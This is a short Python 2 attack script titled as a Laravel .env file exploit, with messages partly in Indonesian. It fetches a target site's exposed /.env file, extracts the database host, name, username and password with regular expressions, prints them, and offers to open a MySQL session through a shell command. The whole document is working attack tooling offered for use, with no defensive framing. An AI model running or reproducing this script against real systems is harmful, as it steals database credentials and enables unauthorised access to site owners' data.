#!/usr/bin/python


import requests
import re
import sys
import time
import os

banner = """
===================================================
=              LARAVEL .ENV FILE EXPLOIT          =
=          AUTHOR : SECURITY007                   =
===================================================
"""

def exp(host):
	req = requests.get(host+"/.env")
	cek_status = req.status_code
	cari = req.text
	if (cek_status == 200):
		print "[+] Vuln"
		time.sleep(1)
		print "[+] Menerima info database"
		time.sleep(1)
		gethost = re.findall("DB_HOST=(.*?)\nDB_PORT=",cari)
		getdb = re.findall("DB_DATABASE=(.*?)\nDB_USERNAME=",cari)
		getuser = re.findall("DB_USERNAME=(.*?)\nDB_PASSWORD",cari)
		getpassw = re.findall("DB_PASSWORD=(.*?)\n\nBROADCAST_DRIVER=",cari)
		show = """
===================[Database Info]======================
= [Host]     : """+gethost[0]+"""
= [Database] : """+getdb[0]+"""
= [User]     : """+getuser[0]+"""
= [Password] : """+getpassw[0]+"""
========================================================
		"""
		print show
		time.sleep(1)
		konek = raw_input("[+] Mau konek ke mysql server ? [y/n] ")
		if (konek == "y"):
			ip = raw_input("Host : ")
			os.system("mysql -h "+ip+" -D "+getdb[0]+" -P 3306 -u "+getuser[0]+" -p ")
		else:
			print "[-] Bye.."
	else:
		print "[-] Not Vuln"
			
		
		
def main():
	print banner
	if (len(sys.argv) == 2):
		exp(sys.argv[1])
	else:
		print "Usage python "+sys.argv[0]+" http://vuln.com/<path> "

if __name__ == "__main__":
	main()